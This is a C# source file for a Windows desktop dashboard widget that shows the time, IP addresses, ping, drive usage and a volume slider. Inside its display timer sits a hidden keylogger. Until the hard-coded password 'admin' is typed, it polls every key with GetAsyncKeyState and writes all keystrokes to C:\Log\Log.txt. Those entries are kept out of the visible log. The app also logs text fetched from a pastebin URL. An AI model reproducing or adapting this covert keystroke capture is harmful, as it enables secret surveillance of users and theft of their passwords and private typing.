using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;


namespace ManagerThing
{
    public partial class MainWindow : Window
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        string pathname = @"C:\Log";
        string _password = "admin";
        bool isAdmin = false;

        private void volumeDownFoo(object sender, MouseButtonEventArgs e) {
            SendMessageW(
                (new WindowInteropHelper(Application.Current.MainWindow).Handle),
                0x319,
                (new WindowInteropHelper(Application.Current.MainWindow).Handle),
                (IntPtr)0x90000);
        }

        private void volumeUpFoo(object sender, MouseButtonEventArgs e) {
            SendMessageW(
                (new WindowInteropHelper(Application.Current.MainWindow).Handle),
                0x319,
                (new WindowInteropHelper(Application.Current.MainWindow).Handle),
                (IntPtr)0xA0000);
        }

        public MainWindow()
        {
            InitializeComponent();

            entryLog(true);
            writeText(DateTime.Now.ToString("'['dd/MM/yyyy'] ------------------ App started'"));

            int iterationCount = 0;

            bool hasInternetConnection = HasInternetConnection();
            bool hasNetworkConnection = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
            this.ipText.Text = (Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)).ToString();

            DispatcherTimer timer = new DispatcherTimer(new TimeSpan(0, 0, 0, 0, 62), DispatcherPriority.Normal, delegate {
                iterationCount++;
                if (iterationCount >= 5) {
                    this.secondsText.Text = DateTime.Now.ToString("ss'.'fff");
                    this.timeText.Text = DateTime.Now.ToString("HH:mm");

                    if (this.beep1.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep1.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep1.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }

                    if (!isAdmin) {
                        for (int j = 0; j < 60; j++) {
                            for (Int32 i = 0; i < 255; i++) {
                                int keyState = GetAsyncKeyState(i);
                                if (keyState == 1 || keyState == -32767) {
                                    string _k = KeyInterop.KeyFromVirtualKey((int)i).ToString();
                                    _k =  (_k == "None")                         ? "MouseDown"    : (_k == "OemPeriod" || _k == "AbntC2")   ? "."
                                        : (_k == "OemComma"  || _k == "Decimal") ? ","            : (_k == "AbntC1"    || _k == "Divide")   ? "/"
                                        : (_k == "Multiply")                     ? "*"            : (_k == "OemMinus"  || _k == "Subtract") ? "-"
                                        : (_k == "OemPlus"  || _k == "Add")      ? "+"            : (_k == "Oem3")                          ? "'"
                                        : (_k == "Oem1" || _k == "Oem5" || _k == "Oem6") ? "§"    : (_k == "OemOpenBrackets")               ? "["
                                        : (_k == "OemQuestion")                  ? "?"            : _k == "Snapshot"                        ? "PrtScn"
                                        : _k == "Scroll"                         ? "ScrollLock"   : _k == "Pause"                           ? "PauseBreak"
                                        : _k == "Back"                           ? "Backspace"    : _k == "Next"                            ? "PageDown" : _k;
                                    try { writeText("[Key       ] " + _k); } catch { Console.WriteLine(">>> Too fast! <<<"); }
                                    break;
                                }
                            }
                        }
                    }
                }

                if (iterationCount == 5) {
                    internetSpeed.Text = pingTime().ToString() + "ms";
                    writeText("[Ping Test ] " + internetSpeed.Text);
                    hasInternetConnection = HasInternetConnection();
                    hasNetworkConnection = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
                    getDrives();
                    this.volumeSlider.Value = (double)GetApplicationVolume("");
                    this.volumeText.Text = GetApplicationVolume("").ToString() + "%";
                }

                if (iterationCount % 4096 == 0) {
                    if (this.beep5.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep5.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep5.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }

                    getDrives();
                }
                
                if (iterationCount % 1024 == 0) {
                    if (this.beep4.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep4.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep4.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }

                    internetSpeed.Text = pingTime().ToString() + "ms";
                    writeText("[Ping Test ] " + internetSpeed.Text);
                }

                if (iterationCount % 64 == 0) {
                    if (this.beep3.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep3.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep3.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }

                    hasInternetConnection = HasInternetConnection();
                    hasNetworkConnection = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
                }

                if (iterationCount % 16 == 0) {
                    if (!isAdmin && this.passwordInput.Password.ToLower() == _password.ToLower()) {
                        this.passwordInput.Visibility = System.Windows.Visibility.Collapsed;
                        isAdmin = true;
                    }
                    this.weekText.Text = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(DateTime.Now.ToString("dddd")).Split('-')[0];
                    this.dayText.Text = DateTime.Now.ToString("dd");
                    int extDay = Convert.ToInt32(this.dayText.Text);
                    this.extText.Text = ((extDay == 1) ? "st" : (extDay == 2) ? "nd" : (extDay == 3) ? "rd" : "th");
                    this.dateText.Text = DateTime.Now.ToString("MM/yyyy");
                    this.dateText.ToolTip = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(DateTime.Now.ToString("MMMM"));

                    this.ipText_local.Text = (Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)).ToString();

                    if (!hasInternetConnection) {
                        if (this.hasInternet.Foreground.ToString().ToLower() != "#ffc42e3b") {
                            this.hasInternet.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffc42e3b");
                            writeText("[Connection] Disconnected");
                        }
                        this.ipText.Text = " ";
                        loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Collapsed;
                    } else {
                        this.hasInternet.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff90ad2f");
                        if (this.ipText.Text == " " || (iterationCount >= 1 && iterationCount <= 20)) {
                            this.ipText.Text = GetPublicIP().ToString();
                        }
                    }
                    if (hasNetworkConnection) {
                        this.hasNetwork.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff90ad2f");
                    } else {
                        this.hasNetwork.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffc42e3b");
                    }

                    if (this.beep2.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep2.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep2.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }
                }
            }, this.Dispatcher);
        }

        private void appClosing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            entryLog(false);
            e.Cancel = true;
            writeText(DateTime.Now.ToString("'['dd/MM/yyyy'] ------------------ App Closed\n'"));
            e.Cancel = false;
        }

        private void DragWindow(object sender, MouseButtonEventArgs e) {  DragMove();  }

        private void MinimizeWindow(object sender, MouseButtonEventArgs e) {  this.WindowState = WindowState.Minimized;  }
        private void AlphaWindow(object sender, MouseButtonEventArgs e) {
            if (this.content.Opacity == 0.3) {
                this.content.Opacity = 0.5;
            } else if (this.content.Opacity == 0.5) {
                this.content.Opacity = 1;
            } else {
                this.content.Opacity = 0.3;
            }
        }

        private void MinimizeWindowEnter(object sender, MouseEventArgs e) {  minimizeWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffeeeeee");  }
        private void MinimizeWindowLeave(object sender, MouseEventArgs e) {  minimizeWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff1c1f25");  }
        private void AlphaWindowEnter(object sender, MouseEventArgs e) {  alphaWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffeeeeee");  }
        private void AlphaWindowLeave(object sender, MouseEventArgs e) {  alphaWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff1c1f25");  }

        private int pingTime()
        {
            try {
                using (Ping p = new Ping()) {
                    PingReply _p = (p.Send("www.google.com"));
                    // Console.WriteLine(_p.Address + " | " + _p.Status);
                    //              IP Address ^
                    return (int)_p.RoundtripTime;
                }
            } catch {
                return -1;
            }
        }

        private void getDrives()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            driveNames.Text = "";
            foreach (DriveInfo drive in drives) {
                driveNames.Text += (drive + " [" + drive.DriveType + (drive.IsReady ? " | " + drive.DriveFormat : "") + "]\n");
                if (drive.IsReady && drive.DriveType.ToString() == "Fixed") {
                    float totalDriveSize = (drive.TotalSize / 1073741824);
                    float totalFreeSize = (drive.TotalFreeSpace / 1073741824);
                    float totalUsedSize = (totalDriveSize - totalFreeSize);
                    availMemoryName.Text = drive.Name;
                    availMemoryValue.Text = "Used " + totalUsedSize + "GB / " + totalDriveSize + "GB";

                    double _usedMemoryPercentage = Math.Abs(rect_totalMemory.Width * (totalUsedSize / totalDriveSize));
                    rect_usedMemory.Width = Math.Floor(_usedMemoryPercentage);
                }
            }
            writeText("[Drive Mngr] " + availMemoryValue.Text);
        }

        public bool HasInternetConnection()
        {
            try {
                string str = "";
                WebRequest request = WebRequest.Create("http://pastebin.com/raw.php?i=fmDaUMae");
                using (WebResponse response = request.GetResponse())
                using (StreamReader stream = new StreamReader(response.GetResponseStream())) {
                    str = stream.ReadToEnd();
                }
                if (str == "0") {
                    return true;
                } else {
                    writeText("[WebResponse] " + str);
                    return false;
                }
            } catch {
                return false;
            }
        }

        public void writeText(string str) {
            str = DateTime.Now.ToString("HH:mm:ss") + " " + str;
            using (StreamWriter file = new StreamWriter(pathname + @"\Log.txt", true)) {
                file.WriteLine(str);
            }
            Console.WriteLine(str);
            if (str.IndexOf("[Key       ]") == -1) {
                log.Text = str + "\n" + log.Text;
            }
        }

        public void entryLog(bool started)
        {
            string str = DateTime.Now.ToString(
                (started ? "'Started at" : "'Closed at ") + " 'HH:mm:ss' - 'dd/MM/yyyy"
            );
            using (StreamWriter file = new StreamWriter(pathname + @"\Index.txt", true)) {
                file.WriteLine((!isAdmin && !started ? "[!] Did not insert password\n" : "") + str + (!started ? "\n" : ""));
            }
        }

        public string GetPublicIP()
        {
            try {
                string direction = "";
                WebRequest request = WebRequest.Create("http://matheus.avellar.c9.io/resources/ip");
                using (WebResponse response = request.GetResponse())
                using (StreamReader stream = new StreamReader(response.GetResponseStream())) {
                    direction = stream.ReadToEnd();
                }
                loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Collapsed;
                writeText("[Connection] " + direction);
                return direction;
            } catch {
                loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Collapsed;
                writeText("[Connection] Error");
                return "127.0.0.1";
            }
        }

        private void IpRefresh(object sender, MouseButtonEventArgs e)
        {
            this.ipText.Text = "127.0.0.1";
            this.ipText_local.Text = "127.0.0.1";
            loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Visible;
            this.ipText.Text = GetPublicIP();
            this.ipText_local.Text = (Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)).ToString();
        }

        private void IpHide(object sender, MouseButtonEventArgs e)
        {
            if (this.ipText.Foreground.ToString().ToLower() == "#ffeeeeee") {
                this.ipText.Foreground = this.ipText_local.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282C35");
                this.ipHide.ToolTip = "Unhide";
                this.ipHide.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff89be6c");
                this.ipHide.Text = "☑";
            } else {
                this.ipText.Foreground = this.ipText_local.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffeeeeee");
                this.ipHide.ToolTip = "Hide";
                this.ipHide.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff444a59");
                this.ipHide.Text = "☒";
            }
        }

        private void onSliderChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            foreach (string name in EnumerateApplications()) {
                SetAllApplicationVolumes((float)Math.Floor(this.volumeSlider.Value));
            }
            
            this.volumeText.Text = (int)this.volumeSlider.Value + "%";
        }
        #region Sound stuff

        public static float? GetApplicationVolume(string name)
        {
            ISimpleAudioVolume volume = GetVolumeObject(name);
            if (volume == null)
                return null;

            float level;
            volume.GetMasterVolume(out level);
            return level * 100;
        }

        public static bool? GetApplicationMute(string name)
        {
            ISimpleAudioVolume volume = GetVolumeObject(name);
            if (volume == null)
                return null;

            bool mute;
            volume.GetMute(out mute);
            return mute;
        }

        public static void SetAllApplicationVolumes(float level)
        {
            IMMDeviceEnumerator deviceEnumerator = (IMMDeviceEnumerator)(new MMDeviceEnumerator());
            IMMDevice speakers;
            deviceEnumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out speakers);

            Guid IID_IAudioSessionManager2 = typeof(IAudioSessionManager2).GUID;
            object o;
            speakers.Activate(ref IID_IAudioSessionManager2, 0, IntPtr.Zero, out o);
            IAudioSessionManager2 mgr = (IAudioSessionManager2)o;

            IAudioSessionEnumerator sessionEnumerator;
            mgr.GetSessionEnumerator(out sessionEnumerator);
            int count;
            sessionEnumerator.GetCount(out count);

            ISimpleAudioVolume volumeControl = null;
            for (int i = 0; i < count; i++) {
                IAudioSessionControl ctl;
                sessionEnumerator.GetSession(i, out ctl);
                string dn;
                ctl.GetDisplayName(out dn);
                volumeControl = ctl as ISimpleAudioVolume;

                if (volumeControl != null) {
                    Guid guid = Guid.Empty;
                    volumeControl.SetMasterVolume(level / 100, ref guid);
                }
                Marshal.ReleaseComObject(ctl);
            }
            Marshal.ReleaseComObject(sessionEnumerator);
            Marshal.ReleaseComObject(mgr);
            Marshal.ReleaseComObject(speakers);
            Marshal.ReleaseComObject(deviceEnumerator);
        }

        public static void SetApplicationVolume(string name, float level)
        {
            ISimpleAudioVolume volume = GetVolumeObject(name);
            if (volume == null)
                return;

            Guid guid = Guid.Empty;
            volume.SetMasterVolume(level / 100, ref guid);
        }

        public static void SetApplicationMute(string name, bool mute)
        {
            ISimpleAudioVolume volume = GetVolumeObject(name);
            if (volume == null)
                return;

            Guid guid = Guid.Empty;
            volume.SetMute(mute, ref guid);
        }

        public static IEnumerable<string> EnumerateApplications()
        {
            // get the speakers (1st render + multimedia) device
            IMMDeviceEnumerator deviceEnumerator = (IMMDeviceEnumerator)(new MMDeviceEnumerator());
            IMMDevice speakers;
            deviceEnumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out speakers);

            // activate the session manager. we need the enumerator
            Guid IID_IAudioSessionManager2 = typeof(IAudioSessionManager2).GUID;
            object o;
            speakers.Activate(ref IID_IAudioSessionManager2, 0, IntPtr.Zero, out o);
            IAudioSessionManager2 mgr = (IAudioSessionManager2)o;

            // enumerate sessions for on this device
            IAudioSessionEnumerator sessionEnumerator;
            mgr.GetSessionEnumerator(out sessionEnumerator);
            int count;
            sessionEnumerator.GetCount(out count);

            for (int i = 0; i < count; i++) {
                IAudioSessionControl ctl;
                sessionEnumerator.GetSession(i, out ctl);
                string dn;
                ctl.GetDisplayName(out dn);
                //Console.WriteLine("[#" + (i + 1) + "] " + (dn == "" ? "Unnamed application" : dn));
                yield return dn;
                Marshal.ReleaseComObject(ctl);
            }
            Marshal.ReleaseComObject(sessionEnumerator);
            Marshal.ReleaseComObject(mgr);
            Marshal.ReleaseComObject(speakers);
            Marshal.ReleaseComObject(deviceEnumerator);
        }

        private static ISimpleAudioVolume GetVolumeObject(string name)
        {
            // get the speakers (1st render + multimedia) device
            IMMDeviceEnumerator deviceEnumerator = (IMMDeviceEnumerator)(new MMDeviceEnumerator());
            IMMDevice speakers;
            deviceEnumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out speakers);

            // activate the session manager. we need the enumerator
            Guid IID_IAudioSessionManager2 = typeof(IAudioSessionManager2).GUID;
            object o;
            speakers.Activate(ref IID_IAudioSessionManager2, 0, IntPtr.Zero, out o);
            IAudioSessionManager2 mgr = (IAudioSessionManager2)o;

            // enumerate sessions for on this device
            IAudioSessionEnumerator sessionEnumerator;
            mgr.GetSessionEnumerator(out sessionEnumerator);
            int count;
            sessionEnumerator.GetCount(out count);

            // search for an audio session with the required name
            // NOTE: we could also use the process id instead of the app name (with IAudioSessionControl2)
            ISimpleAudioVolume volumeControl = null;
            for (int i = 0; i < count; i++) {
                IAudioSessionControl ctl;
                sessionEnumerator.GetSession(i, out ctl);
                string dn;
                ctl.GetDisplayName(out dn);
                if (string.Compare(name, dn, StringComparison.OrdinalIgnoreCase) == 0) {
                    volumeControl = ctl as ISimpleAudioVolume;
                    break;
                }
                Marshal.ReleaseComObject(ctl);
            }
            Marshal.ReleaseComObject(sessionEnumerator);
            Marshal.ReleaseComObject(mgr);
            Marshal.ReleaseComObject(speakers);
            Marshal.ReleaseComObject(deviceEnumerator);
            return volumeControl;
        }
        #endregion
    }
 
    #region More sound stuff


    [ComImport]
    [Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
    internal class MMDeviceEnumerator
    {
    }

    internal enum EDataFlow
    {
        eRender,
        eCapture,
        eAll,
        EDataFlow_enum_count
    }

    internal enum ERole
    {
        eConsole,
        eMultimedia,
        eCommunications,
        ERole_enum_count
    }

    [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface IMMDeviceEnumerator
    {
        int NotImpl1();

        [PreserveSig]
        int GetDefaultAudioEndpoint(EDataFlow dataFlow, ERole role, out IMMDevice ppDevice);

        // the rest is not implemented
    }

    [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface IMMDevice
    {
        [PreserveSig]
        int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, [MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);

        // the rest is not implemented
    }

    [Guid("77AA99A0-1BD6-484F-8BC7-2C654C9A9B6F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface IAudioSessionManager2
    {
        int NotImpl1();
        int NotImpl2();

        [PreserveSig]
        int GetSessionEnumerator(out IAudioSessionEnumerator SessionEnum);

        // the rest is not implemented
    }

    [Guid("E2F5BB11-0570-40CA-ACDD-3AA01277DEE8"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface IAudioSessionEnumerator
    {
        [PreserveSig]
        int GetCount(out int SessionCount);

        [PreserveSig]
        int GetSession(int SessionCount, out IAudioSessionControl Session);
    }

    [Guid("F4B1A599-7266-4319-A8CA-E70ACB11E8CD"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface IAudioSessionControl
    {
        int NotImpl1();

        [PreserveSig]
        int GetDisplayName([MarshalAs(UnmanagedType.LPWStr)] out string pRetVal);

        // the rest is not implemented
    }

    [Guid("87CE5498-68D6-44E5-9215-6DA47EF883D8"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface ISimpleAudioVolume
    {
        [PreserveSig]
        int SetMasterVolume(float fLevel, ref Guid EventContext);

        [PreserveSig]
        int GetMasterVolume(out float pfLevel);

        [PreserveSig]
        int SetMute(bool bMute, ref Guid EventContext);

        [PreserveSig]
        int GetMute(out bool pbMute);
    }

    #endregion
}